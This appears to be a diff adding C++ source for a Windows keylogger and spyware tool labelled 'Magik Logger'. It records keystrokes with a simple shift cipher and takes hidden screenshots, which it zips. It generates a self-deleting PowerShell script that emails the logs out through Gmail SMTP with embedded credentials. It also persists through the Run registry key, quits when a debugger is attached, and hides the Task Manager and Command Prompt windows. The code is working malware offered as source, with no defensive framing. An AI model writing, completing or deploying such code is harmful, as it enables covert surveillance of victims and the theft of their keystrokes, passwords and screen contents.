+        SetFileAttributesA(ScreenshotDir.c_str(), FILE_ATTRIBUTE_HIDDEN);
+        for (int i = 0; i < 20; i++) {
+            CurrentLog = ScreenshotDir;
+            CurrentLog += "\\ScreenShot";
+            CurrentLog += std::to_string(rand() % 10000 - 1000);
+            CurrentLog += ".bmp";
+
+            SaveBitmap(CurrentLog.c_str());
+
+            Sleep(SecondsBetweenScreenshots);
+        }
+        std::string ZipPath = ScreenshotDir;
+        ZipPath += "\\Zip";
+        ZipPath += std::to_string(rand() % 10000 - 1000);
+        ZipPath += ".zip";
+
+        FILE* f = fopen(ZipPath.c_str(), "wb");
+        fwrite("\x50\x4B\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 22, 1, f);
+        fclose(f);
+
+        const char* files[] = {
+            ScreenshotDir.c_str()
+        };
+
+        {
+            CoInitialize(NULL);
+            CopyItems(std::cbegin(files), std::cend(files), ZipPath.c_str());
+            CoUninitialize();
+        }
+
+        if (!InternetGetConnectedState(&DWFlags, NULL)) {
+            //SetUploadTask(Emailer, ZipPath);
+        }
+        else {
+            SendLog(ZipPath);
+        }
+
+        Sleep(60000);
+
+        SilentlyRemoveDirectory(ScreenshotDir.c_str());
+
+    }
+}
+
+
+int ExtrapolateKey() {
+
+    std::string Passwd = CryptPassword;
+    int ExtrapolatedKey = BaseShiftValue;
+    for (int plq = 0; plq < Passwd.size(); plq++) {
+        ExtrapolatedKey += (int)Passwd[plq];
+    }
+    return ExtrapolatedKey;
+}
+
+
+int CalculateDirSize(std::string DirectoryToCheck) {
+
+    HANDLE hFind;
+    WIN32_FIND_DATAA data;
+
+    DirectoryToCheck += "\\*.*";
+
+    int FileCounter = 0;
+
+    //char FilePath[MAX_PATH + 1];
+    DWORD FileSize = MAX_PATH + 1;
+
+    hFind = FindFirstFileA(DirectoryToCheck.c_str(), &data);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            //GetFinalPathNameByHandleA(hFind, FilePath, FileSize, 0x0);
+            //if (!(GetFileAttributesA(FilePath) & FILE_ATTRIBUTE_DIRECTORY)) {
+            FileCounter++;
+            //}
+        } while (FindNextFileA(hFind, &data));
+        FindClose(hFind);
+    }
+
+    return FileCounter;
+}
+
+
+BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
+{
+    HKEY hKey = NULL;
+    LONG lResult = 0;
+    BOOL fSuccess = TRUE;
+    DWORD dwSize;
+
+    const size_t count = MAX_PATH * 2;
+    char szValue[count] = {};
+
+
+    strcpy_s(szValue, "\"");
+    strcat_s(szValue, pathToExe);
+    strcat_s(szValue, "\" ");
+
+    if (args != NULL)
+    {
+        strcat_s(szValue, args);
+    }
+
+    lResult = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
+
+    fSuccess = (lResult == 0);
+
+    if (fSuccess)
+    {
+        dwSize = (DWORD)(strlen(szValue) + 1) * 2;
+        lResult = RegSetValueExA(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
+        fSuccess = (lResult == 0);
+    }
+
+    if (hKey != NULL)
+    {
+        RegCloseKey(hKey);
+        hKey = NULL;
+    }
+
+    return fSuccess;
+}
+
+std::string EncryptMyString(std::string UnencryptedString) {
+#ifndef debug
+    std::string CryptedString;
+    for (int r = 0; r < UnencryptedString.size(); r++) {
+        CryptedString += UnencryptedString[r] + ExtrapolateKey();
+    }
+    UnencryptedString = CryptedString;
+#endif
+    return UnencryptedString;
+}
+
+void LogItInt(int key_stroke, std::string FileName) {
+    if (key_stroke == 1 || key_stroke == 2)
+        return;
+    if (key_stroke == VK_MBUTTON || key_stroke == VK_XBUTTON1 || key_stroke == VK_XBUTTON2 || key_stroke == 7)
+        return;
+
+    fopen_s(&OUTPUT_FILE, FileName.c_str(), "a+");
+
+    std::cout << key_stroke << std::endl;
+
+    if (key_stroke == 8)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[BACKSPACE]"));
+    else if (key_stroke == 13)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("\n"));
+    else if (key_stroke == VK_SPACE)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString(" "));
+    else if (key_stroke == VK_LWIN)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[WIN]"));
+    else if (key_stroke == VK_TAB)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[TAB]"));
+    else if (key_stroke == VK_CAPITAL)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CAPS LOCK]"));
+    else if (key_stroke == VK_SHIFT)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[SHIFT]"));
+    else if (key_stroke == VK_CONTROL)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CONTROL]")); //later check for clipboard
+    else if (key_stroke == VK_ESCAPE)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[ESCAPE]"));
+    else if (key_stroke == VK_END)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[END]"));
+    else if (key_stroke == VK_HOME)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[HOME]"));
+    else if (key_stroke == VK_DELETE)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DELETE]"));
+    else if (key_stroke == VK_LEFT)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[LEFT]"));
+    else if (key_stroke == VK_UP)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[UP]"));
+    else if (key_stroke == VK_RIGHT)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[RIGHT]"));
+    else if (key_stroke == VK_DOWN)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DOWN]"));
+    else if (key_stroke == 190 || key_stroke == 110)
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("."));
+    else
+#ifndef debug
+        key_stroke += ExtrapolateKey();
+#endif
+    fprintf(OUTPUT_FILE, "%s", &key_stroke);
+    fclose(OUTPUT_FILE);
+}
+
+void LogItChar(std::string Value, std::string FileName) {
+#ifndef debug
+    if (IsDebuggerPresent()) {
+        exit(0);
+    }
+
+#endif
+
+    Value += "\n";
+
+    std::ofstream File;
+    File.open(FileName, std::ios_base::app);
+    File << EncryptMyString(Value);
+    File.close();
+}
+
+void SendLog(std::string CurrentLog) {
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+    DWORD WrittenBytes, DWFlags;
+    char* AppData = nullptr;
+    size_t AppDataSize;
+    _dupenv_s(&AppData, &AppDataSize, "APPDATA");
+    std::string Powershell = AppData;
+    Powershell += "\\MagikIndex\\PSScript";
+    Powershell += std::to_string(GetTickCount());
+    Powershell += ".PS1";
+    std::string PSStartup = "MagikMailer";
+    PSStartup += std::to_string(GetTickCount());
+    HANDLE PS1File = CreateFileA(Powershell.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    std::string a = "$online = test - connection 8.8.8.8 - Count 1 - Quiet\nif ($online)\n{\n$SMTPServer = 'smtp.gmail.com'\n$SMTPInfo = New - Object Net.Mail.SmtpClient($SmtpServer, 587)\n$SMTPInfo.EnableSsl = $true\n$SMTPInfo.Credentials = New - Object System.Net.NetworkCredential('";
+    std::string b = "', '";
+    std::string c = "')\n$ReportEmail = New - Object System.Net.Mail.MailMessage\n$ReportEmail.From = '";
+    std::string d = "'\n$ReportEmail.To.Add('";
+    std::string e = "')$ReportEmail.Subject = 'MagikIndex'\n$ReportEmail.Body = 'Your Magik Logger'\n$ReportEmail.Attachments.Add('";
+    std::string f = "')\n$SMTPInfo.Send($ReportEmail)\nRemove - Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
+    WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
+    WriteFile(PS1File, SendersEmail, (DWORD)strlen(SendersEmail), &WrittenBytes, NULL);
+    WriteFile(PS1File, b.c_str(), (DWORD)strlen(b.c_str()), &WrittenBytes, NULL);
+    WriteFile(PS1File, SendersPsw, (DWORD)strlen(SendersPsw), &WrittenBytes, NULL);
+    WriteFile(PS1File, c.c_str(), (DWORD)strlen(c.c_str()), &WrittenBytes, NULL);
+    WriteFile(PS1File, SendersEmail, (DWORD)strlen(SendersEmail), &WrittenBytes, NULL);
+    WriteFile(PS1File, d.c_str(), (DWORD)strlen(d.c_str()), &WrittenBytes, NULL);
+    WriteFile(PS1File, RecieversEmail, (DWORD)strlen(RecieversEmail), &WrittenBytes, NULL);
+    WriteFile(PS1File, e.c_str(), (DWORD)strlen(e.c_str()), &WrittenBytes, NULL);
+    WriteFile(PS1File, CurrentLog.c_str(), (DWORD)strlen(CurrentLog.c_str()), &WrittenBytes, NULL);
+    WriteFile(PS1File, f.c_str(), (DWORD)strlen(f.c_str()), &WrittenBytes, NULL);
+    CloseHandle(PS1File);
+    if (!InternetGetConnectedState(&DWFlags, NULL)) {
+        LogItChar("No Internet, scheduling task for log extraction...", CurrentLog);
+        RegisterMyProgramForStartup(PSStartup.c_str(), Powershell.c_str(), "");
+    }else{
+        LogItChar("Connected to the internet, sending the log...", CurrentLog);
+        CreateProcessA(Powershell.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+}
+
+ULONG WINAPI Protect(LPVOID Parameter) {
+
+    if (IsDebuggerPresent()) {
+        exit(0);
+    }
+    while (1) {
+
+        HWND Prog;
+        Prog = FindWindowA(NULL, "Task Manager");
+        ShowWindow(Prog, 0);
+        Prog = FindWindowA(NULL, "Windows Task Manager");
+        ShowWindow(Prog, 0);
+        Prog = FindWindowA(NULL, "Command Prompt");
+        ShowWindow(Prog, 0);
+        Prog = FindWindowA(NULL, "C:\\Windows\\System32\\cmd.exe");
+        ShowWindow(Prog, 0);
+        Prog = FindWindowA(NULL, "Run");
+        ShowWindow(Prog, 0);
+        Sleep(200);
+    }
+    return 0;
+}
+
 
 #pragma warning( pop )
